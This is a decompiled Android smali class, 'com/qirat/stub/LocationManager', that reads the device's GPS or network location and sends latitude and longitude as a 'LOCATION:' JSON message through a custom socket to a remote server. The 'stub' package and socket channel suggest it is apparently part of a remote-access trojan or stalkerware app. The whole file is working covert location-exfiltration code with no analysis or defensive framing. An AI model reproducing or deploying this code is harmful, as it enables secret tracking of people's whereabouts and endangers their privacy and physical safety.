.class public Lcom/qirat/stub/LocationManager;
.super Ljava/lang/Object;
.source "LocationManager.java"

# interfaces
.implements Landroid/location/LocationListener;


# static fields
.field private static final MIN_DISTANCE_CHANGE_FOR_UPDATES:J = 0xaL

.field private static final MIN_TIME_BW_UPDATES:J = 0xea60L

.field private static final TAG:Ljava/lang/String; = "LocationManager"


# instance fields
.field private locationManager:Landroid/location/LocationManager;

.field private final mContext:Landroid/content/Context;


# direct methods
.method public constructor <init>(Landroid/content/Context;)V
    .locals 1
    .param p1, "context"    # Landroid/content/Context;

    .line 27
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 28
    invoke-virtual {p1}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iput-object v0, p0, Lcom/qirat/stub/LocationManager;->mContext:Landroid/content/Context;

    .line 29
    return-void
.end method

.method private sendLocationToServer(Landroid/location/Location;)V
    .locals 5
    .param p1, "location"    # Landroid/location/Location;

    .line 79
    const-string v0, "LocationManager"

    :try_start_0
    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    .line 80
    .local v1, "locationData":Lorg/json/JSONObject;
    const-string v2, "latitude"

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v3

    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 81
    const-string v2, "longitude"

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v3

    invoke-virtual {v1, v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    .line 84
    iget-object v2, p0, Lcom/qirat/stub/LocationManager;->mContext:Landroid/content/Context;

    invoke-static {v2}, Lcom/qirat/stub/Socket;->getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;

    move-result-object v2

    .line 85
    .local v2, "socket":Lcom/qirat/stub/Socket;
    invoke-virtual {v2}, Lcom/qirat/stub/Socket;->isConnected()Z

    move-result v3

    if-eqz v3, :cond_0

    .line 86
    const-string v3, "Sending location to server..."

    invoke-static {v0, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 87
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "LOCATION:"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v1}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    goto :goto_0

    .line 89
    :cond_0
    const-string v3, "Cannot send location, socket not connected."

    invoke-static {v0, v3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 93
    .end local v1    # "locationData":Lorg/json/JSONObject;
    .end local v2    # "socket":Lcom/qirat/stub/Socket;
    :goto_0
    goto :goto_1

    .line 91
    :catch_0
    move-exception v1

    .line 92
    .local v1, "e":Lorg/json/JSONException;
    const-string v2, "Failed to create location JSON"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 94
    .end local v1    # "e":Lorg/json/JSONException;
    :goto_1
    return-void
.end method


# virtual methods
.method public fetchAndSendLocation()V
    .locals 6

    .line 37
    const-string v0, "network"

    const-string v1, "gps"

    iget-object v2, p0, Lcom/qirat/stub/LocationManager;->mContext:Landroid/content/Context;

    const-string v3, "android.permission.ACCESS_FINE_LOCATION"

    invoke-static {v2, v3}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    const-string v3, "LocationManager"

    if-eqz v2, :cond_0

    iget-object v2, p0, Lcom/qirat/stub/LocationManager;->mContext:Landroid/content/Context;

    .line 38
    const-string v4, "android.permission.ACCESS_COARSE_LOCATION"

    invoke-static {v2, v4}, Landroidx/core/app/ActivityCompat;->checkSelfPermission(Landroid/content/Context;Ljava/lang/String;)I

    move-result v2

    if-eqz v2, :cond_0

    .line 39
    const-string v0, "Location permission not granted. Cannot get location."

    invoke-static {v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 40
    return-void

    .line 44
    :cond_0
    :try_start_0
    iget-object v2, p0, Lcom/qirat/stub/LocationManager;->mContext:Landroid/content/Context;

    const-string v4, "location"

    invoke-virtual {v2, v4}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/location/LocationManager;

    iput-object v2, p0, Lcom/qirat/stub/LocationManager;->locationManager:Landroid/location/LocationManager;

    .line 45
    iget-object v2, p0, Lcom/qirat/stub/LocationManager;->locationManager:Landroid/location/LocationManager;

    if-nez v2, :cond_1

    .line 46
    const-string v0, "LocationManager service not available."

    invoke-static {v3, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 47
    return-void

    .line 50
    :cond_1
    iget-object v2, p0, Lcom/qirat/stub/LocationManager;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v2, v1}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v2

    .line 51
    .local v2, "isGPSEnabled":Z
    iget-object v4, p0, Lcom/qirat/stub/LocationManager;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v4, v0}, Landroid/location/LocationManager;->isProviderEnabled(Ljava/lang/String;)Z

    move-result v4

    .line 53
    .local v4, "isNetworkEnabled":Z
    if-nez v2, :cond_2

    if-nez v4, :cond_2

    .line 54
    const-string v0, "No location provider is enabled."

    invoke-static {v3, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    .line 57
    :cond_2
    const/4 v5, 0x0

    if-eqz v2, :cond_3

    .line 58
    const-string v0, "Requesting location update from GPS_PROVIDER."

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 59
    iget-object v0, p0, Lcom/qirat/stub/LocationManager;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v0, v1, p0, v5}, Landroid/location/LocationManager;->requestSingleUpdate(Ljava/lang/String;Landroid/location/LocationListener;Landroid/os/Looper;)V

    goto :goto_0

    .line 60
    :cond_3
    if-eqz v4, :cond_4

    .line 61
    const-string v1, "Requesting location update from NETWORK_PROVIDER."

    invoke-static {v3, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 62
    iget-object v1, p0, Lcom/qirat/stub/LocationManager;->locationManager:Landroid/location/LocationManager;

    invoke-virtual {v1, v0, p0, v5}, Landroid/location/LocationManager;->requestSingleUpdate(Ljava/lang/String;Landroid/location/LocationListener;Landroid/os/Looper;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 67
    .end local v2    # "isGPSEnabled":Z
    .end local v4    # "isNetworkEnabled":Z
    :cond_4
    :goto_0
    goto :goto_1

    .line 65
    :catch_0
    move-exception v0

    .line 66
    .local v0, "e":Ljava/lang/Exception;
    const-string v1, "Error getting location"

    invoke-static {v3, v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 68
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_1
    return-void
.end method

.method public onLocationChanged(Landroid/location/Location;)V
    .locals 3
    .param p1, "location"    # Landroid/location/Location;

    .line 72
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Location received: Lat="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1}, Landroid/location/Location;->getLatitude()D

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, ", Lon="

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1}, Landroid/location/Location;->getLongitude()D

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "LocationManager"

    invoke-static {v1, v0}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 74
    invoke-direct {p0, p1}, Lcom/qirat/stub/LocationManager;->sendLocationToServer(Landroid/location/Location;)V

    .line 75
    return-void
.end method

.method public onProviderDisabled(Ljava/lang/String;)V
    .locals 0
    .param p1, "provider"    # Ljava/lang/String;

    .line 105
    return-void
.end method

.method public onProviderEnabled(Ljava/lang/String;)V
    .locals 0
    .param p1, "provider"    # Ljava/lang/String;

    .line 102
    return-void
.end method

.method public onStatusChanged(Ljava/lang/String;ILandroid/os/Bundle;)V
    .locals 0
    .param p1, "provider"    # Ljava/lang/String;
    .param p2, "status"    # I
    .param p3, "extras"    # Landroid/os/Bundle;

    .line 99
    return-void
.end method
